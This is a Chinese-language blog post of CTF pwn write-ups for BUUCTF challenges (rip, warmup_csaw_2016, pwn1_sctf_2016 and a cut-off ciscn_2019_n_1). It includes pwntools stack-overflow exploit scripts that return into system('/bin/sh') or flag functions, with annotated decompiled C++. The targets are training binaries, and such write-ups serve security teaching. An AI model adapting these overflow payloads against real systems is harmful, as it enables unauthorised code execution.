<!DOCTYPE html>
<html lang="zh-CN" color-mode="light">

  <head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <meta name="keywords" content="" />
  <meta name="author" content="arttnba3" />
  <meta name="description" content="あがいた夢を捨てて揺れる今日は眠って誤魔化せ" />
  
  
  <title>
    
      【CTF.0x00】BUUCTF/BUUOJ-Pwn WP 
      
      
      |
    
     arttnba3&#39;s blog
  </title>

  
    <link rel="apple-touch-icon" href="/img/favicon.png">
    <link rel="icon" href="/img/favicon.png">
  

  <!-- Raleway-Font -->
  <link href="https://fonts.googleapis.com/css?family=Raleway&display=swap" rel="stylesheet">

  <!-- hexo site css -->
  
<link rel="stylesheet" href="/css/color-scheme.css">
<link rel="stylesheet" href="/css/base.css">
<link rel="stylesheet" href="//at.alicdn.com/t/font_1886449_67xjft27j1l.css">
<link rel="stylesheet" href="/css/github-markdown.css">
<link rel="stylesheet" href="/css/highlight.css">
<link rel="stylesheet" href="/css/comments.css">

  <!-- 代码块风格 -->
  

  <!-- jquery3.3.1 -->
  
    <script defer type="text/javascript" src="/plugins/jquery.min.js"></script>
  

  <!-- fancybox -->
  
    <link href="/plugins/jquery.fancybox.min.css" rel="stylesheet">
    <script defer type="text/javascript" src="/plugins/jquery.fancybox.min.js"></script>
  
  
<script src="/js/fancybox.js"></script>


  

  <script>
    var html = document.documentElement
    const colorMode = localStorage.getItem('color-mode')
    if (colorMode) {
      document.documentElement.setAttribute('color-mode', colorMode)
    }
  </script>
<meta name="generator" content="Hexo 6.2.0"><link rel="alternate" href="/atom.xml" title="arttnba3's blog" type="application/atom+xml">
</head>


  <body>
    <div id="app">
      <div class="header">
  <div class="avatar">
    <a target="_blank" rel="noopener" href="https://arttnba3.cn">
      <!-- 头像取消懒加载，添加no-lazy -->
      
        <img src="/img/avatar.png" alt="">
      
    </a>
    <div class="nickname"><a target="_blank" rel="noopener" href="https://arttnba3.cn">arttnba3's blog</a></div>
  </div>
  <div class="navbar">
    <ul>
      
        <li class="nav-item" data-path="/">
          <a href="/">Home</a>
        </li>
      
        <li class="nav-item" data-path="/archives/">
          <a href="/archives/">Archives</a>
        </li>
      
        <li class="nav-item" data-path="/categories/">
          <a href="/categories/">Categories</a>
        </li>
      
        <li class="nav-item" data-path="/tags/">
          <a href="/tags/">Tags</a>
        </li>
      
        <li class="nav-item" data-path="/friends/">
          <a href="/friends/">Friends</a>
        </li>
      
        <li class="nav-item" data-path="/about/">
          <a href="/about/">About</a>
        </li>
      
    </ul>
  </div>
</div>


<script src="/js/activeNav.js"></script>



      <div class="flex-container">
        <!-- 文章详情页，展示文章具体内容，url形式：https://yoursite/文章标题/ -->
<!-- 同时为「标签tag」，「朋友friend」，「分类categories」，「关于about」页面的承载页面，具体展示取决于page.type -->


  <!-- LaTex Display -->

  
    <script async type="text/javascript" src="/plugins/mathjax/tex-chtml.js"></script>
  
  <script>
    MathJax = {
      tex: {
        inlineMath: [['$', '$'], ['\\(', '\\)']]
      }
    }
  </script>





  <!-- clipboard -->

  
    <script async type="text/javascript" src="/plugins/clipboard.min.js"></script>
  
  
<script src="/js/codeCopy.js"></script>







  

  

  

  
  <!-- 文章内容页 url形式：https://yoursite/文章标题/ -->
  <div class="container post-details" id="post-details">
    <div class="post-content">
      <div class="post-title">【CTF.0x00】BUUCTF/BUUOJ-Pwn WP</div>
      <div class="post-attach">
        <span class="post-pubtime">
          <i class="iconfont icon-updatetime" title="更新时间"></i>
          2020-09-08 02:09:30
        </span>
        
              <span class="post-categories">
                <i class="iconfont icon-bookmark" title="分类"></i>
                
                <span class="span--category">
                  <a href="/categories/CTF/" title="CTF">
                    <b>#</b> CTF
                  </a>
                </span>
                
              </span>
          
              <span class="post-tags">
                <i class="iconfont icon-tags" title="标签"></i>
                
                <span class="span--tag">
                  <a href="/tags/Pwn/" title="Pwn">
                    <b>#</b> Pwn
                  </a>
                </span>
                
                <span class="span--tag">
                  <a href="/tags/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/" title="信息安全">
                    <b>#</b> 信息安全
                  </a>
                </span>
                
                <span class="span--tag">
                  <a href="/tags/%E5%A0%86/" title="堆">
                    <b>#</b> 堆
                  </a>
                </span>
                
                <span class="span--tag">
                  <a href="/tags/CTF/" title="CTF">
                    <b>#</b> CTF
                  </a>
                </span>
                
                <span class="span--tag">
                  <a href="/tags/Use-After-Free/" title="Use After Free">
                    <b>#</b> Use After Free
                  </a>
                </span>
                
                <span class="span--tag">
                  <a href="/tags/ret2libc/" title="ret2libc">
                    <b>#</b> ret2libc
                  </a>
                </span>
                
                <span class="span--tag">
                  <a href="/tags/ret2text/" title="ret2text">
                    <b>#</b> ret2text
                  </a>
                </span>
                
                <span class="span--tag">
                  <a href="/tags/ROP/" title="ROP">
                    <b>#</b> ROP
                  </a>
                </span>
                
                <span class="span--tag">
                  <a href="/tags/%E6%A0%88%E6%BA%A2%E5%87%BA/" title="栈溢出">
                    <b>#</b> 栈溢出
                  </a>
                </span>
                
                <span class="span--tag">
                  <a href="/tags/ret2shellcode/" title="ret2shellcode">
                    <b>#</b> ret2shellcode
                  </a>
                </span>
                
                <span class="span--tag">
                  <a href="/tags/shellcode/" title="shellcode">
                    <b>#</b> shellcode
                  </a>
                </span>
                
                <span class="span--tag">
                  <a href="/tags/%E5%A0%86%E9%A3%8E%E6%B0%B4/" title="堆风水">
                    <b>#</b> 堆风水
                  </a>
                </span>
                
                <span class="span--tag">
                  <a href="/tags/got%E8%A1%A8%E5%8A%AB%E6%8C%81/" title="got表劫持">
                    <b>#</b> got表劫持
                  </a>
                </span>
                
                <span class="span--tag">
                  <a href="/tags/%E6%A0%88%E8%BF%81%E7%A7%BB/" title="栈迁移">
                    <b>#</b> 栈迁移
                  </a>
                </span>
                
                <span class="span--tag">
                  <a href="/tags/IO-FILE-hijack/" title="_IO_FILE hijack">
                    <b>#</b> _IO_FILE hijack
                  </a>
                </span>
                
                <span class="span--tag">
                  <a href="/tags/Fastbin-Attack/" title="Fastbin Attack">
                    <b>#</b> Fastbin Attack
                  </a>
                </span>
                
                <span class="span--tag">
                  <a href="/tags/FSOP/" title="FSOP">
                    <b>#</b> FSOP
                  </a>
                </span>
                
                <span class="span--tag">
                  <a href="/tags/Heap-Overflow/" title="Heap Overflow">
                    <b>#</b> Heap Overflow
                  </a>
                </span>
                
                <span class="span--tag">
                  <a href="/tags/House-of-Force/" title="House of Force">
                    <b>#</b> House of Force
                  </a>
                </span>
                
                <span class="span--tag">
                  <a href="/tags/House-of-Orange/" title="House of Orange">
                    <b>#</b> House of Orange
                  </a>
                </span>
                
                <span class="span--tag">
                  <a href="/tags/House-of-Spirit/" title="House of Spirit">
                    <b>#</b> House of Spirit
                  </a>
                </span>
                
                <span class="span--tag">
                  <a href="/tags/off-by-one/" title="off by one">
                    <b>#</b> off by one
                  </a>
                </span>
                
                <span class="span--tag">
                  <a href="/tags/one-gadget/" title="one_gadget">
                    <b>#</b> one_gadget
                  </a>
                </span>
                
                <span class="span--tag">
                  <a href="/tags/python/" title="python">
                    <b>#</b> python
                  </a>
                </span>
                
                <span class="span--tag">
                  <a href="/tags/Unlink/" title="Unlink">
                    <b>#</b> Unlink
                  </a>
                </span>
                
                <span class="span--tag">
                  <a href="/tags/Unsorted-bin-Attack/" title="Unsorted bin Attack">
                    <b>#</b> Unsorted bin Attack
                  </a>
                </span>
                
                <span class="span--tag">
                  <a href="/tags/canary/" title="canary">
                    <b>#</b> canary
                  </a>
                </span>
                
                <span class="span--tag">
                  <a href="/tags/Integer-Overflow/" title="Integer Overflow">
                    <b>#</b> Integer Overflow
                  </a>
                </span>
                
                <span class="span--tag">
                  <a href="/tags/off-by-null/" title="off by null">
                    <b>#</b> off by null
                  </a>
                </span>
                
                <span class="span--tag">
                  <a href="/tags/ret2csu/" title="ret2csu">
                    <b>#</b> ret2csu
                  </a>
                </span>
                
                <span class="span--tag">
                  <a href="/tags/SROP/" title="SROP">
                    <b>#</b> SROP
                  </a>
                </span>
                
                <span class="span--tag">
                  <a href="/tags/Stack-Smashing-Protect-leak/" title="Stack Smashing Protect leak">
                    <b>#</b> Stack Smashing Protect leak
                  </a>
                </span>
                
              </span>
          
      </div>
      <div class="markdown-body">
        <p>刷题针不戳（</p>
<span id="more"></span>

<h1 id="0x000-绪论"><a href="#0x000-绪论" class="headerlink" title="0x000.绪论"></a>0x000.绪论</h1><p><a href="buuoj.cn">BUUCTF</a>是一个巨型CTF题库，大致可以类比OIer们的洛谷一样的地方，在BUUCTF上有着分类齐全数量庞大的各方向题目，包括各大CTF的原题</p>
<p>正所谓”不刷BUU非CTFer“（<del>哪里有过这种奇怪的话啦</del>），作为一名新晋的蒟蒻CTFer&amp;网安专业选手，咱也来做一做BUUCTF上的题，并把题解在博客上存档一份方便后来者学习（<del>快醒醒，哪里会有人看你的博客啦XD</del></p>
<blockquote>
<p>原本是放在archive站点的，但是想来我又不是以后都不在BUU上做题了，所以就搬到主站来了XD</p>
<p>由于是分时期做的，笔者经历了kali主力→manjaro主力→ubuntu主力的过程，因此可能不同的题的shell的画风会不大一样:)</p>
</blockquote>
<h1 id="0x001-0x010"><a href="#0x001-0x010" class="headerlink" title="0x001 ~ 0x010"></a>0x001 ~ 0x010</h1><h2 id="0x001-test-your-nc-nc"><a href="#0x001-test-your-nc-nc" class="headerlink" title="0x001.test your nc - nc"></a>0x001.test your nc - nc</h2><p>拖入IDA分析，发现一运行就能直接getshell</p>
<p><img src="https://i.loli.net/2020/08/15/AqJPwtME8FmvHos.png" alt="image.png"></p>
<p>nc，成功getshell，得flag</p>
<p><img src="https://i.loli.net/2020/08/15/5Ze2Nw94jmRxUJF.png" alt="image.png"></p>
<h2 id="0x002-rip-ret2text"><a href="#0x002-rip-ret2text" class="headerlink" title="0x002.rip - ret2text"></a>0x002.rip - ret2text</h2><p>惯例的<code>checksec</code>，保护全关</p>
<p><img src="https://i.loli.net/2020/08/14/HPO2siU8DpyfnYG.png" alt="image.png"></p>
<p>主函数使用了gets函数，存在栈溢出，偏移量为0xf+8个字节</p>
<p><img src="https://i.loli.net/2020/08/14/NxMSvtUf7wZ9iY4.png" alt="image.png"></p>
<p>可以发现直接存在一个<code>system(&quot;/bin/sh&quot;)</code>，返回到这里即可getshell</p>
<p><img src="https://i.loli.net/2020/08/14/rhUu8p2mc6MyXsi.png" alt="image.png"></p>
<p>构造payload如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span> * (<span class="number">0xf</span> + <span class="number">8</span>) + p64(<span class="number">0x40118a</span>)</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./rip&#x27;</span>)<span class="comment">#p = remote(&#x27;node3.buuoj.cn&#x27;,26914)</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>



<p>输入我们的<code>payload</code>，直接getshell，得到flag</p>
<p><img src="https://i.loli.net/2020/08/14/7fGrIXzylhN49YM.png" alt="image.png"></p>
<h2 id="0x003-warmup-csaw-2016-ret2text"><a href="#0x003-warmup-csaw-2016-ret2text" class="headerlink" title="0x003.warmup_csaw_2016 - ret2text"></a>0x003.warmup_csaw_2016 - ret2text</h2><p>惯例<code>checksec</code>，保护全关，可以为所欲为</p>
<p><img src="https://i.loli.net/2020/08/15/2Oy9SNjZuKEI75t.png" alt="image.png"></p>
<p>拖入IDA，发现可以溢出的<code>gets</code>函数，偏移量是0x40+8个字节</p>
<p><img src="https://i.loli.net/2020/08/15/UcPklJTz8G5brHx.png" alt="image.png"></p>
<p>又发现一个可以获得flag的gadget<code>system(&quot;cat flag.txt&quot;)</code>，控制程序返回到这里即可获得flag</p>
<p><img src="https://i.loli.net/2020/08/15/KLPE8bTj2kWszU3.png" alt="image.png"></p>
<p>故构造payload如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span>* (<span class="number">0x40</span> + <span class="number">8</span>) + p64(<span class="number">0x400611</span>)</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./warm_up_2016&#x27;</span>)<span class="comment"># p = remote(&#x27;node3.buuoj.cn&#x27;,28660)</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>输入我们的payload，得到flag</p>
<p><img src="https://i.loli.net/2020/08/15/V6ZjsuOYfCUhMLJ.png" alt="image.png"></p>
<h2 id="0x004-pwn1-sctf-2016-ret2text"><a href="#0x004-pwn1-sctf-2016-ret2text" class="headerlink" title="0x004.pwn1_sctf_2016 - ret2text"></a>0x004.pwn1_sctf_2016 - ret2text</h2><p>惯例的<code>checksec</code>，发现只开了NX保护</p>
<p><img src="https://i.loli.net/2020/09/07/NAUM59LC7FSuZ6V.png" alt="image.png"></p>
<p>拖入IDA看一下，<del>然后你就会发现C++逆向出来的东西比**还**</del></p>
<p><img src="https://i.loli.net/2020/09/07/5FsRKWxZSiME8ug.png" alt="image.png"></p>
<p>我们不难看出replace函数是在该程序中的一个比较关键的函数，我们先进去简单看看：</p>
<p><img src="https://i.loli.net/2020/09/07/vwAz9J8tIlN5DpB.png" alt="image.png"></p>
<p>简单通读一下我们大概知道这段代码的运行过程如下：（<del>不就是**🐎有什么读不懂的，干他就完事了</del></p>
<p><img src="https://i.loli.net/2020/09/08/U7P6A1HlfkZGsXi.png" alt="image.png"></p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">std::string *__stdcall <span class="title">replace</span><span class="params">(std::string *a1, std::string *a2, std::string *a3, std::string *a4)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// ST04_4</span></span><br><span class="line">  <span class="type">int</span> v5; <span class="comment">// ST04_4</span></span><br><span class="line">  <span class="type">int</span> v6; <span class="comment">// ST10_4</span></span><br><span class="line">  <span class="type">char</span> v8; <span class="comment">// [esp+10h] [ebp-48h]</span></span><br><span class="line">  <span class="type">char</span> v9; <span class="comment">// [esp+14h] [ebp-44h]</span></span><br><span class="line">  <span class="type">char</span> v10; <span class="comment">// [esp+1Bh] [ebp-3Dh]</span></span><br><span class="line">  <span class="type">int</span> v11; <span class="comment">// [esp+1Ch] [ebp-3Ch]</span></span><br><span class="line">  <span class="type">char</span> v12; <span class="comment">// [esp+20h] [ebp-38h]</span></span><br><span class="line">  <span class="type">int</span> v13; <span class="comment">// [esp+24h] [ebp-34h]</span></span><br><span class="line">  <span class="type">int</span> v14; <span class="comment">// [esp+28h] [ebp-30h]</span></span><br><span class="line">  <span class="type">char</span> v15; <span class="comment">// [esp+2Fh] [ebp-29h]</span></span><br><span class="line">  <span class="type">int</span> v16; <span class="comment">// [esp+30h] [ebp-28h]</span></span><br><span class="line">  <span class="type">int</span> v17; <span class="comment">// [esp+34h] [ebp-24h]</span></span><br><span class="line">  <span class="type">char</span> v18; <span class="comment">// [esp+38h] [ebp-20h]</span></span><br><span class="line">  <span class="type">int</span> v19; <span class="comment">// [esp+3Ch] [ebp-1Ch]</span></span><br><span class="line">  <span class="type">char</span> v20; <span class="comment">// [esp+40h] [ebp-18h]</span></span><br><span class="line">  <span class="type">int</span> v21; <span class="comment">// [esp+44h] [ebp-14h]</span></span><br><span class="line">  <span class="type">char</span> v22; <span class="comment">// [esp+48h] [ebp-10h]</span></span><br><span class="line">  <span class="type">char</span> v23; <span class="comment">// [esp+4Ch] [ebp-Ch]</span></span><br><span class="line">                                                <span class="comment">// 接收参数为：v6,input,v9,v7</span></span><br><span class="line">                                                <span class="comment">// 其中input为我们的输入，v9为字符串&quot;I&quot;，v7为字符串&quot;you&quot;</span></span><br><span class="line">                                                <span class="comment">// 查汇编源码可知下面的string基本都是a2，也就是input</span></span><br><span class="line">  <span class="keyword">while</span> ( std::string::<span class="built_in">find</span>(a2, a3, <span class="number">0</span>) != <span class="number">-1</span> )  <span class="comment">// 在input中寻找字符串v9（&quot;I&quot;），如果找不到则find方法会返回-1，跳出循环</span></span><br><span class="line">  &#123;</span><br><span class="line">    std::allocator&lt;<span class="type">char</span>&gt;::<span class="built_in">allocator</span>(&amp;v10);      <span class="comment">// 新构造了一个allocator&lt;char&gt;类的实例并将地址给到v10</span></span><br><span class="line">    v11 = std::string::<span class="built_in">find</span>(a2, a3, <span class="number">0</span>);         <span class="comment">// 获得&quot;I&quot;字符串在input中第一次出现的下标</span></span><br><span class="line">    std::string::<span class="built_in">begin</span>(&amp;v12);                   <span class="comment">// input.begin()新构造一个迭代器对象并将地址给到v12</span></span><br><span class="line">    __gnu_cxx::__normal_iterator&lt;<span class="type">char</span> *,std::string&gt;::<span class="keyword">operator</span>+(&amp;v13);<span class="comment">// 构建operator+的迭代器对象实例给到v13</span></span><br><span class="line">    std::string::<span class="built_in">begin</span>(&amp;v14);                   <span class="comment">// input.begin()新构造一个迭代器对象并将地址给到v14</span></span><br><span class="line">    std::string::string&lt;__gnu_cxx::__normal_iterator&lt;<span class="type">char</span> *,std::string&gt;&gt;(&amp;v9, v14, v13, &amp;v10);<span class="comment">// v14迭代生成的字符使用allocator（v10）分配内存、使用operator+（v13）接成新字符串给到v8</span></span><br><span class="line">                                                <span class="comment">// 查看汇编可知生成的字符串长度为v11（即生成的字符串为input中第一个&quot;I&quot;的前面所有字符构成的字符串</span></span><br><span class="line">    std::allocator&lt;<span class="type">char</span>&gt;::~<span class="built_in">allocator</span>(&amp;v10, v4); <span class="comment">// 析构v10</span></span><br><span class="line">    std::allocator&lt;<span class="type">char</span>&gt;::<span class="built_in">allocator</span>(&amp;v15);      <span class="comment">// 新构造了一个allocator&lt;char&gt;类的实例并将地址给到v15</span></span><br><span class="line">    std::string::<span class="built_in">end</span>(&amp;v16);                     <span class="comment">// input.end()新构造一个迭代器对象并将地址给到v16</span></span><br><span class="line">    v17 = std::string::<span class="built_in">length</span>(a3);              <span class="comment">// 获得&quot;I&quot;的长度给到v17</span></span><br><span class="line">    v19 = std::string::<span class="built_in">find</span>(a2, a3, <span class="number">0</span>);         <span class="comment">// 获得&quot;I&quot;字符串在input中第一次出现的下标给到v19</span></span><br><span class="line">    std::string::<span class="built_in">begin</span>(&amp;v20);                   <span class="comment">// begin()新构造一个迭代器对象并将地址给到v20</span></span><br><span class="line">    __gnu_cxx::__normal_iterator&lt;<span class="type">char</span> *,std::string&gt;::<span class="keyword">operator</span>+(&amp;v18);<span class="comment">// 构建operator+的迭代器对象实例给到v18</span></span><br><span class="line">    __gnu_cxx::__normal_iterator&lt;<span class="type">char</span> *,std::string&gt;::<span class="keyword">operator</span>+(&amp;v21);<span class="comment">// 构建operator+的迭代器对象实例给到v21</span></span><br><span class="line">    std::string::string&lt;__gnu_cxx::__normal_iterator&lt;<span class="type">char</span> *,std::string&gt;&gt;(&amp;v8, v21, v16, &amp;v15);<span class="comment">// v16迭代生成的字符使用allocator（v15）分配内存、使用operator+（v21）接成新字符串给到v8</span></span><br><span class="line">                                                <span class="comment">// 注意在这里和前面的相似语句中字符串迭代器与operator所传入的位置是相反的</span></span><br><span class="line">                                                <span class="comment">// 可能是因为迭代器从后往前生成字符串？</span></span><br><span class="line">    std::allocator&lt;<span class="type">char</span>&gt;::~<span class="built_in">allocator</span>(&amp;v15, v5); <span class="comment">// 析构v15</span></span><br><span class="line">    std::<span class="keyword">operator</span>+&lt;<span class="type">char</span>,std::char_traits&lt;<span class="type">char</span>&gt;,std::allocator&lt;<span class="type">char</span>&gt;&gt;(&amp;v23, &amp;v9, a4);<span class="comment">// v9+a4生成的字符串给到v23</span></span><br><span class="line">                                                <span class="comment">// 即input中第一个&quot;I&quot;之前的所有字符构成的字符串再加上&quot;you&quot;生成新字符串v23</span></span><br><span class="line">    std::<span class="keyword">operator</span>+&lt;<span class="type">char</span>,std::char_traits&lt;<span class="type">char</span>&gt;,std::allocator&lt;<span class="type">char</span>&gt;&gt;(&amp;v22, &amp;v23, &amp;v8);<span class="comment">// v23+v8生成的字符串给到v22</span></span><br><span class="line">                                                <span class="comment">// 即v23再加上原input中第一个&quot;I&quot;之后的所有字符构成的字符串生成新字符串v22</span></span><br><span class="line">    std::string::<span class="keyword">operator</span>=(a2, &amp;v22, v6);       <span class="comment">// v22给回到a2（也就是input</span></span><br><span class="line">    std::string::~<span class="built_in">string</span>(&amp;v22);                 <span class="comment">// 析构v20</span></span><br><span class="line">    std::string::~<span class="built_in">string</span>(&amp;v23);                 <span class="comment">// 析构v21</span></span><br><span class="line">    std::string::~<span class="built_in">string</span>(&amp;v8);                  <span class="comment">// 析构v8</span></span><br><span class="line">    std::string::~<span class="built_in">string</span>(&amp;v9);                  <span class="comment">// 析构v9</span></span><br><span class="line">  &#125;</span><br><span class="line">  std::string::<span class="built_in">string</span>(a1, a2);                  <span class="comment">// 拷贝input到a1（vuln中v6）</span></span><br><span class="line">  <span class="keyword">return</span> a1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>我们可以大概知道replace函数的作用其实是把<strong>输入的字符串中的所有字串A替换成字符串B再重新生成新的字符串</strong>，而在vuln函数中A即为<code>&quot;I&quot;</code>，B即为<code>&quot;you&quot;</code>。</p>
<p>重新回到<code>vuln</code>函数，我们发现依然看不懂这段代码到底干了啥</p>
<p>这个时候其实我们可以选择看汇编代码进行辅助阅读（<del>C++逆向出来的东西真的太**了</del></p>
<p><img src="https://i.loli.net/2020/09/07/SCp5I7mvXc9HDWQ.png" alt="image.png"></p>
<p>简单结合一下汇编代码与逆向出来的C++代码，我们容易知道该段代码的作用，如下图注释所示：</p>
<p><img src="https://i.loli.net/2020/09/07/vTxCYDnofhqdSKQ.png" alt="image.png"></p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">fgets</span>(&amp;s, <span class="number">32</span>, edata);                         <span class="comment">// 从标准输入流中读入最大32个字符到s</span></span><br><span class="line">std::string::<span class="keyword">operator</span>=(&amp;input, &amp;s);           <span class="comment">// 将字符串s的值拷贝到string类input中</span></span><br><span class="line">std::allocator&lt;<span class="type">char</span>&gt;::<span class="built_in">allocator</span>((<span class="type">int</span>)&amp;v8);    <span class="comment">// 新构造了一个allocator&lt;char&gt;类的实例并将地址给到v8</span></span><br><span class="line">std::string::<span class="built_in">string</span>((<span class="type">int</span>)&amp;v7, (<span class="type">int</span>)<span class="string">&quot;you&quot;</span>, (<span class="type">int</span>)&amp;v8);<span class="comment">// string类使用allocrator分配内存复制字符串&quot;you&quot;并拷贝到v7上</span></span><br><span class="line">std::allocator&lt;<span class="type">char</span>&gt;::<span class="built_in">allocator</span>((<span class="type">int</span>)&amp;v10);   <span class="comment">// 新构造了一个allocator&lt;char&gt;类的实例并将地址给到v10</span></span><br><span class="line">std::string::<span class="built_in">string</span>((<span class="type">int</span>)&amp;v9, (<span class="type">int</span>)<span class="string">&quot;I&quot;</span>, (<span class="type">int</span>)&amp;v10);<span class="comment">// string类使用allocrator分配内存复制字符串&quot;I&quot;并拷贝到v6上</span></span><br><span class="line"><span class="built_in">replace</span>((std::string *)&amp;v6, (std::string *)&amp;input, (std::string *)&amp;v9);<span class="comment">// 遍历input，生成新string把原input中的&#x27;I&#x27;替换为&#x27;you&#x27;，并将重新生成后的字符串地址给到v6</span></span><br><span class="line">std::string::<span class="keyword">operator</span>=(&amp;input, &amp;v6, v0);      <span class="comment">// 拷贝v6回到input中，完成替换</span></span><br><span class="line">std::string::~<span class="built_in">string</span>((std::string *)&amp;v6);     <span class="comment">// 析构v6</span></span><br><span class="line">std::string::~<span class="built_in">string</span>((std::string *)&amp;v9);     <span class="comment">// 析构v9</span></span><br><span class="line">std::allocator&lt;<span class="type">char</span>&gt;::~<span class="built_in">allocator</span>(&amp;v10, v1);   <span class="comment">// 析构v10</span></span><br><span class="line">std::string::~<span class="built_in">string</span>((std::string *)&amp;v7);     <span class="comment">// 析构v7</span></span><br><span class="line">std::allocator&lt;<span class="type">char</span>&gt;::~<span class="built_in">allocator</span>(&amp;v8, v2);    <span class="comment">// 析构v8</span></span><br><span class="line">v3 = (<span class="type">const</span> <span class="type">char</span> *)std::string::<span class="built_in">c_str</span>((std::string *)&amp;input);<span class="comment">// 将input使用string类的c_str函数变成字符串存放在char数组中并将字符串指针赋给v3</span></span><br><span class="line"><span class="built_in">strcpy</span>(&amp;s, v3);                               <span class="comment">// 将v3拷贝到s上</span></span><br></pre></td></tr></table></figure>

<p>简单运行一下，我们可以发现程序的确会把输入中的<code>I</code>全部替换成<code>you</code></p>
<p><img src="https://i.loli.net/2020/09/07/EkemdSOlb9Jj5IM.png" alt="image.png"></p>
<p>同时我们可以看到，溢出大概需要<code>0x3c</code>个字节，也就是60个字节</p>
<p><img src="https://i.loli.net/2020/09/07/7iJUWvxtPjVlckS.png" alt="image.png"></p>
<p>我们可以选择使用20个<code>I</code>作为padding，然后这段padding会被替换成30个<code>you</code>，刚好60个字节，在后面再覆盖掉ebp与返回地址控制程序返回到<code>get_flag</code>函数即可得到flag</p>
<p>故构造exp如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">get_flag_addr = <span class="number">0x8048fd</span></span><br><span class="line">p = process(<span class="string">&#x27;./pwn1_sctf_2016&#x27;</span>)<span class="comment">#p = remote(&#x27;node3.buuoj.cn&#x27;,27140)</span></span><br><span class="line">payload = <span class="string">b&#x27;I&#x27;</span>*<span class="number">20</span> + p32(<span class="number">0xdeadbeef</span>) + p32(get_flag_addr)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recv()</span><br></pre></td></tr></table></figure>

<p>发送payload，得到flag</p>
<p><img src="https://i.loli.net/2020/09/07/nZcqDhPo5sFWm6X.png" alt="image.png"></p>
<blockquote>
<p>C++逆向是真的kskjklasjdkajskdhasjdgsgdhsgdsajkqpiwourevz</p>
</blockquote>
<h2 id="0x005-ciscn-2019-n-1-overwrite"><a href="#0x005-ciscn-2019-n-1-overwrite" class="headerlink" title="0x005.ciscn_2019_n_1 - overwrite"></a>0x005.ciscn_2019_n_1 - overwrite</h2><p>惯例的<code>checksec</code>，发现只开了NX保护</p>
<p><img src="https://i.loli.net/2020/09/08/IlHxaAwpoKmFdJ5.png" alt="image.png"></p>
<p>拖入IDA进行分析，main中调用了func函数，直接进去看</p>
<p><img src="https://i.loli.net/2020/09/08/RyLZ98UPXJp4jQh.png" alt="image.png"></p>
<p>当v2为11.28125时我们可以获取flag，而gets函数读入到v1存在溢出点可以覆写掉v2</p>
<p>那么问题来了，<strong>浮点数11.28125在内存中是如何表示的呢</strong></p>
<p>我们可以直接跳转到这个数据所储存的地方，发现是<code>0x41348000</code></p>
<p><img src="https://i.loli.net/2020/09/08/wvTE9Qhr18oXU6Z.png" alt="image.png"></p>
<p>故构造exp如下：</p>
